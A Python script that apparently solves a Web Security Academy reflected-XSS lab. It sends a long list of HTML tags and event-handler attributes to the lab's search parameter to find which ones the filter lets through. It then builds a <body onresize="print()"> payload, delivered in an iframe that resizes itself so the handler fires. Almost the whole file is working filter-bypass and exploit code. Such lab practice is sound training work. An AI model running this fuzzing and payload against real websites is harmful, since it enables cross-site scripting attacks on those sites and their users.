import http.client
import ssl
import urllib
import urllib.parse

LAB_ID = "???"


def GET_(
        search: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('search', search),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=0, i',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", '', headers)
    return connection.getresponse()


tags = [
    "<!--...-->",
    "<!DOCTYPE>",
    "<a>",
    "<abbr>",
    "<acronym>",
    "<address>",
    "<applet>",
    "<area>",
    "<article>",
    "<aside>",
    "<audio>",
    "<b>",
    "<base>",
    "<basefont>",
    "<bdi>",
    "<bdo>",
    "<big>",
    "<blockquote>",
    "<body>",
    "<br>",
    "<button>",
    "<canvas>",
    "<caption>",
    "<center>",
    "<cite>",
    "<code>",
    "<col>",
    "<colgroup>",
    "<data>",
    "<datalist>",
    "<dd>",
    "<del>",
    "<details>",
    "<dfn>",
    "<dialog>",
    "<dir>",
    "<div>",
    "<dl>",
    "<dt>",
    "<em>",
    "<embed>",
    "<fieldset>",
    "<figcaption>",
    "<figure>",
    "<font>",
    "<footer>",
    "<form>",
    "<frame>",
    "<frameset>",
    "<h1> to <h6>",
    "<head>",
    "<header>",
    "<hgroup>",
    "<hr>",
    "<html>",
    "<i>",
    "<iframe>",
    "<img>",
    "<input>",
    "<ins>",
    "<kbd>",
    "<label>",
    "<legend>",
    "<li>",
    "<link>",
    "<main>",
    "<map>",
    "<mark>",
    "<menu>",
    "<meta>",
    "<meter>",
    "<nav>",
    "<noframes>",
    "<noscript>",
    "<object>",
    "<ol>",
    "<optgroup>",
    "<option>",
    "<output>",
    "<p>",
    "<param>",
    "<picture>",
    "<pre>",
    "<progress>",
    "<q>",
    "<rp>",
    "<rt>",
    "<ruby>",
    "<s>",
    "<samp>",
    "<script>",
    "<search>",
    "<section>",
    "<select>",
    "<small>",
    "<source>",
    "<span>",
    "<strike>",
    "<strong>",
    "<style>",
    "<sub>",
    "<summary>",
    "<sup>",
    "<svg>",
    "<table>",
    "<tbody>",
    "<td>",
    "<template>",
    "<textarea>",
    "<tfoot>",
    "<th>",
    "<thead>",
    "<time>",
    "<title>",
    "<tr>",
    "<track>",
    "<tt>",
    "<u>",
    "<ul>",
    "<var>",
    "<video>",
    "<wbr>",
]
events = [
    "onafterprint",
    "onafterscriptexecute",
    "onanimationcancel",
    "onanimationend",
    "onanimationiteration",
    "onanimationstart",
    "onauxclick",
    "onbeforecopy",
    "onbeforecut",
    "onbeforeinput",
    "onbeforeprint",
    "onbeforescriptexecute",
    "onbeforetoggle",
    "onbeforeunload",
    "onbegin",
    "onblur",
    "oncanplay",
    "oncanplaythrough",
    "onchange",
    "onclick",
    "onclose",
    "oncontextmenu",
    "oncopy",
    "oncuechange",
    "oncut",
    "ondblclick",
    "ondrag",
    "ondragend",
    "ondragenter",
    "ondragexit",
    "ondragleave",
    "ondragover",
    "ondragstart",
    "ondrop",
    "ondurationchange",
    "onend",
    "onended",
    "onerror",
    "onfocus",
    "onfocus(autofocus)",
    "onfocusin",
    "onfocusout",
    "onformdata",
    "onfullscreenchange",
    "onhashchange",
    "oninput",
    "oninvalid",
    "onkeydown",
    "onkeypress",
    "onkeyup",
    "onload",
    "onloadeddata",
    "onloadedmetadata",
    "onloadstart",
    "onmessage",
    "onmousedown",
    "onmouseenter",
    "onmouseleave",
    "onmousemove",
    "onmouseout",
    "onmouseover",
    "onmouseup",
    "onmousewheel",
    "onmozfullscreenchange",
    "onpagehide",
    "onpageshow",
    "onpaste",
    "onpause",
    "onplay",
    "onplaying",
    "onpointercancel",
    "onpointerdown",
    "onpointerenter",
    "onpointerleave",
    "onpointermove",
    "onpointerout",
    "onpointerover",
    "onpointerrawupdate",
    "onpointerup",
    "onpopstate",
    "onprogress",
    "onratechange",
    "onrepeat",
    "onreset",
    "onresize",
    "onscroll",
    "onscrollend",
    "onsearch",
    "onseeked",
    "onseeking",
    "onselect",
    "onselectionchange",
    "onselectstart",
    "onshow",
    "onsubmit",
    "onsuspend",
    "ontimeupdate",
    "ontoggle",
    "ontoggle(popover)",
    "ontouchend",
    "ontouchmove",
    "ontouchstart",
    "ontransitioncancel",
    "ontransitionend",
    "ontransitionrun",
    "ontransitionstart",
    "onunhandledrejection",
    "onunload",
    "onvolumechange",
    "onwebkitanimationend",
    "onwebkitanimationiteration",
    "onwebkitanimationstart",
    "onwebkitmouseforcechanged",
    "onwebkitmouseforcedown",
    "onwebkitmouseforceup",
    "onwebkitmouseforcewillbegin",
    "onwebkitplaybacktargetavailabilitychanged",
    "onwebkittransitionend",
    "onwebkitwillrevealbottom",
    "onwheel",
]
print("allowed tags:")
for tag in tags:
    response = GET_(search=tag)
    if response.status == 400 and response.read().decode() == "\"Tag is not allowed\"":
        continue
    print(tag)
print("<body> tag is allowed")
print()
tag = "body"

print("allowed events:")
for event in events:
    response = GET_(search=f"<{tag} {event}=1>")
    if response.status == 400 and response.read().decode() == "\"Attribute is not allowed\"":
        continue
    print(event)
print("onresize event is allowed")
print()
event = "onresize"

payload = f"""<{tag} {event}="print()">"""
print("Exploit:")
print(f"""
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
""")
print("Body:")
print(f"""
<iframe src="https://{LAB_ID}.web-security-academy.net?search={urllib.parse.quote_plus(payload)}" onload="this.style.width='100px'"></iframe>
""")